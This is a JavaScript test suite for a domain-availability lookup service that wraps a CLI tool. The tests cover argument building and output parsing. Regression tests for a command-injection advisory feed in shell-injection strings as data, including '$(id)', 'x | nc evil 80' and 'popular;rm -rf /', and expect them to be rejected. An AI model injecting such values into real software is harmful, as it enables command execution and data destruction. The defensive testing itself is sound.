import { expect } from 'chai';
import { domainLookupService } from '../src/service.js';

describe('Domain Lookup Service', () => {
  describe('buildTldxArgs', () => {
    it('should build basic args', () => {
      const args = domainLookupService.buildTldxArgs(['example']);
      expect(args).to.deep.equal(['example']);
    });

    it('should build args with multiple keywords', () => {
      const args = domainLookupService.buildTldxArgs(['example', 'test']);
      expect(args).to.deep.equal(['example', 'test']);
    });

    it('should build args with prefixes', () => {
      const args = domainLookupService.buildTldxArgs(['example'], {
        prefixes: ['get', 'my'],
      });
      expect(args).to.include('example');
      expect(args).to.include.members(['--prefixes', 'get,my']);
    });

    it('should build args with suffixes', () => {
      const args = domainLookupService.buildTldxArgs(['example'], {
        suffixes: ['ly', 'hub'],
      });
      expect(args).to.include('example');
      expect(args).to.include.members(['--suffixes', 'ly,hub']);
    });

    it('should build args with TLDs', () => {
      const args = domainLookupService.buildTldxArgs(['example'], {
        tlds: ['com', 'io', 'ai'],
      });
      expect(args).to.include('example');
      expect(args).to.include.members(['--tlds', 'com,io,ai']);
    });

    it('should build args with format option', () => {
      const args = domainLookupService.buildTldxArgs(['example'], {
        format: 'json',
      });
      expect(args).to.include('example');
      expect(args).to.include.members(['--format', 'json']);
    });

    it('should build args with onlyAvailable flag', () => {
      const args = domainLookupService.buildTldxArgs(['example'], {
        onlyAvailable: true,
      });
      expect(args).to.include('example');
      expect(args).to.include('--only-available');
    });

    it('should build args with maxDomainLength', () => {
      const args = domainLookupService.buildTldxArgs(['example'], {
        maxDomainLength: 20,
      });
      expect(args).to.include('example');
      expect(args).to.include.members(['--max-domain-length', '20']);
    });

    it('should build args with tldPreset', () => {
      const args = domainLookupService.buildTldxArgs(['example'], {
        tldPreset: 'popular',
      });
      expect(args).to.include('example');
      expect(args).to.include.members(['--tld-preset', 'popular']);
    });

    it('should build args with showStats flag', () => {
      const args = domainLookupService.buildTldxArgs(['example'], {
        showStats: true,
      });
      expect(args).to.include('example');
      expect(args).to.include('--show-stats');
    });

    it('should build args with verbose flag', () => {
      const args = domainLookupService.buildTldxArgs(['example'], {
        verbose: true,
      });
      expect(args).to.include('example');
      expect(args).to.include('--verbose');
    });

    it('should build args with noColor flag', () => {
      const args = domainLookupService.buildTldxArgs(['example'], {
        noColor: true,
      });
      expect(args).to.include('example');
      expect(args).to.include('--no-color');
    });

    it('should build args with all options', () => {
      const options = {
        prefixes: ['get', 'my'],
        suffixes: ['ly', 'hub'],
        tlds: ['com', 'io'],
        format: 'json',
        onlyAvailable: true,
        maxDomainLength: 20,
        tldPreset: 'popular',
        showStats: true,
        verbose: true,
        noColor: true,
      };

      const args = domainLookupService.buildTldxArgs(['example'], options);

      expect(args).to.include('example');
      expect(args).to.include.members(['--prefixes', 'get,my']);
      expect(args).to.include.members(['--suffixes', 'ly,hub']);
      expect(args).to.include.members(['--tlds', 'com,io']);
      expect(args).to.include.members(['--format', 'json']);
      expect(args).to.include('--only-available');
      expect(args).to.include.members(['--max-domain-length', '20']);
      expect(args).to.include.members(['--tld-preset', 'popular']);
      expect(args).to.include('--show-stats');
      expect(args).to.include('--verbose');
      expect(args).to.include('--no-color');
    });

    // Regression tests for GHSA-v6wj-c83f-v46x: keywords/domains and option
    // values must not pass through unsanitized — shell metacharacters that
    // previously enabled OS command injection should be rejected outright.
    it('should reject keyword containing shell metacharacters', () => {
      expect(() =>
        domainLookupService.buildTldxArgs(['example.com; echo pwned > /tmp/x; #'])
      ).to.throw(/Invalid keyword/);
    });

    it('should reject keyword with command substitution', () => {
      expect(() => domainLookupService.buildTldxArgs(['$(id)'])).to.throw(/Invalid keyword/);
      expect(() => domainLookupService.buildTldxArgs(['`id`'])).to.throw(/Invalid keyword/);
    });

    it('should reject keyword with pipe or redirect', () => {
      expect(() => domainLookupService.buildTldxArgs(['x | nc evil 80'])).to.throw(/Invalid keyword/);
      expect(() => domainLookupService.buildTldxArgs(['x > /tmp/f'])).to.throw(/Invalid keyword/);
    });

    it('should reject prefixes/suffixes/tlds containing shell metacharacters', () => {
      expect(() =>
        domainLookupService.buildTldxArgs(['safe'], { prefixes: ['ok', 'bad;rm'] })
      ).to.throw(/Invalid prefixes/);
      expect(() =>
        domainLookupService.buildTldxArgs(['safe'], { suffixes: ['ok', '`id`'] })
      ).to.throw(/Invalid suffixes/);
      expect(() =>
        domainLookupService.buildTldxArgs(['safe'], { tlds: ['com', 'io;ls'] })
      ).to.throw(/Invalid tlds/);
    });

    it('should reject tldPreset containing metacharacters', () => {
      expect(() =>
        domainLookupService.buildTldxArgs(['safe'], { tldPreset: 'popular;rm -rf /' })
      ).to.throw(/Invalid tldPreset/);
    });

    it('should reject non-allowlisted format value', () => {
      expect(() =>
        domainLookupService.buildTldxArgs(['safe'], { format: 'json; echo x' })
      ).to.throw(/Invalid format/);
    });

    it('should reject out-of-range maxDomainLength', () => {
      expect(() =>
        domainLookupService.buildTldxArgs(['safe'], { maxDomainLength: '20; ls' })
      ).to.throw(/Invalid maxDomainLength/);
      expect(() =>
        domainLookupService.buildTldxArgs(['safe'], { maxDomainLength: 0 })
      ).to.throw(/Invalid maxDomainLength/);
      expect(() =>
        domainLookupService.buildTldxArgs(['safe'], { maxDomainLength: 9999 })
      ).to.throw(/Invalid maxDomainLength/);
    });

    it('should reject empty keywords array', () => {
      expect(() => domainLookupService.buildTldxArgs([])).to.throw(/non-empty array/);
    });
  });

  describe('parseOutput', () => {
    it('should route to correct parser based on format', () => {
      const textOutput = '✔️ example.com is available';
      const jsonOutput = '[{"domain":"example.com","available":true}]';
      const csvOutput = 'domain,available,error\nexample.com,true,';

      const textResult = domainLookupService.parseOutput(textOutput, 'text');
      const jsonResult = domainLookupService.parseOutput(jsonOutput, 'json');
      const csvResult = domainLookupService.parseOutput(csvOutput, 'csv');

      expect(textResult).to.have.length(1);
      expect(jsonResult).to.have.length(1);
      expect(csvResult).to.have.length(1);
    });
  });

  describe('parseTextOutput', () => {
    it('should parse available domains', () => {
      const output = '✔️ example.com is available\n✔️ test.org is available';
      const result = domainLookupService.parseTextOutput(output);

      expect(result).to.have.length(2);
      expect(result[0]).to.deep.equal({
        domain: 'example.com',
        available: true,
        status: 'available',
      });
      expect(result[1]).to.deep.equal({
        domain: 'test.org',
        available: true,
        status: 'available',
      });
    });

    it('should parse unavailable domains', () => {
      const output = '❌ google.com is not available\n❌ facebook.com is not available';
      const result = domainLookupService.parseTextOutput(output);

      expect(result).to.have.length(2);
      expect(result[0]).to.deep.equal({
        domain: 'google.com',
        available: false,
        status: 'not available',
      });
      expect(result[1]).to.deep.equal({
        domain: 'facebook.com',
        available: false,
        status: 'not available',
      });
    });

    it('should handle mixed availability', () => {
      const output = '✔️ example.com is available\n❌ google.com is not available';
      const result = domainLookupService.parseTextOutput(output);

      expect(result).to.have.length(2);
      expect(result[0].available).to.be.true;
      expect(result[1].available).to.be.false;
    });

    it('should ignore irrelevant lines', () => {
      const output = 'Some header\n✔️ example.com is available\nSome footer';
      const result = domainLookupService.parseTextOutput(output);

      expect(result).to.have.length(1);
      expect(result[0].domain).to.equal('example.com');
    });

    it('should handle empty output', () => {
      const result = domainLookupService.parseTextOutput('');
      expect(result).to.be.an('array').that.is.empty;
    });
  });

  describe('parseJsonOutput', () => {
    it('should parse valid JSON array', () => {
      const output = JSON.stringify([
        { domain: 'example.com', available: true },
        { domain: 'google.com', available: false },
      ]);
      const result = domainLookupService.parseJsonOutput(output);

      expect(result).to.have.length(2);
      expect(result[0]).to.deep.include({
        domain: 'example.com',
        available: true,
        status: 'available',
      });
      expect(result[1]).to.deep.include({
        domain: 'google.com',
        available: false,
        status: 'not available',
      });
    });

    it('should handle empty JSON array', () => {
      const output = '[]';
      const result = domainLookupService.parseJsonOutput(output);
      expect(result).to.be.an('array').that.is.empty;
    });

    it('should throw error for invalid JSON', () => {
      expect(() => {
        domainLookupService.parseJsonOutput('invalid json');
      }).to.throw('Failed to parse JSON output');
    });

    it('should handle non-array JSON', () => {
      const output = '{"not": "array"}';
      const result = domainLookupService.parseJsonOutput(output);
      expect(result).to.be.an('array').that.is.empty;
    });
  });

  describe('parseJsonStreamOutput', () => {
    it('should parse JSON stream format', () => {
      const output =
        '{"domain":"example.com","available":true}\n{"domain":"google.com","available":false}';
      const result = domainLookupService.parseJsonStreamOutput(output);

      expect(result).to.have.length(2);
      expect(result[0]).to.deep.include({
        domain: 'example.com',
        available: true,
        status: 'available',
      });
      expect(result[1]).to.deep.include({
        domain: 'google.com',
        available: false,
        status: 'not available',
      });
    });

    it('should skip invalid JSON lines', () => {
      const output =
        '{"domain":"example.com","available":true}\ninvalid json\n{"domain":"test.org","available":true}';
      const result = domainLookupService.parseJsonStreamOutput(output);

      expect(result).to.have.length(2);
      expect(result[0].domain).to.equal('example.com');
      expect(result[1].domain).to.equal('test.org');
    });

    it('should handle empty output', () => {
      const result = domainLookupService.parseJsonStreamOutput('');
      expect(result).to.be.an('array').that.is.empty;
    });
  });

  describe('parseCsvOutput', () => {
    it('should parse CSV format correctly', () => {
      const output = 'domain,available,error\nexample.com,true,\ngoogle.com,false,some error';
      const result = domainLookupService.parseCsvOutput(output);

      expect(result).to.have.length(2);
      expect(result[0]).to.deep.include({
        domain: 'example.com',
        available: true,
        status: 'available',
        error: null,
      });
      expect(result[1]).to.deep.include({
        domain: 'google.com',
        available: false,
        status: 'not available',
        error: 'some error',
      });
    });

    it('should handle empty CSV', () => {
      const output = 'domain,available,error';
      const result = domainLookupService.parseCsvOutput(output);
      expect(result).to.be.an('array').that.is.empty;
    });

    it('should handle CSV with only header', () => {
      const output = 'domain,available,error\n';
      const result = domainLookupService.parseCsvOutput(output);
      expect(result).to.be.an('array').that.is.empty;
    });
  });

  describe('parseTldPresets', () => {
    it('should parse TLD presets correctly', () => {
      const output = `== TLD Presets ==

- business: com, co, biz, ltd, llc, inc
- creative: art, design, ink
- popular: com, co, io, net, org, ai`;

      const result = domainLookupService.parseTldPresets(output);

      expect(result).to.be.an('object');
      expect(result.business).to.deep.equal(['com', 'co', 'biz', 'ltd', 'llc', 'inc']);
      expect(result.creative).to.deep.equal(['art', 'design', 'ink']);
      expect(result.popular).to.deep.equal(['com', 'co', 'io', 'net', 'org', 'ai']);
    });

    it('should handle empty preset output', () => {
      const result = domainLookupService.parseTldPresets('');
      expect(result).to.be.an('object').that.is.empty;
    });

    it('should ignore non-preset lines', () => {
      const output = `== TLD Presets ==
Some header
- business: com, co, biz
Some footer
- tech: io, ai, dev`;

      const result = domainLookupService.parseTldPresets(output);
      expect(result).to.have.property('business');
      expect(result).to.have.property('tech');
      expect(Object.keys(result)).to.have.length(2);
    });
  });
});
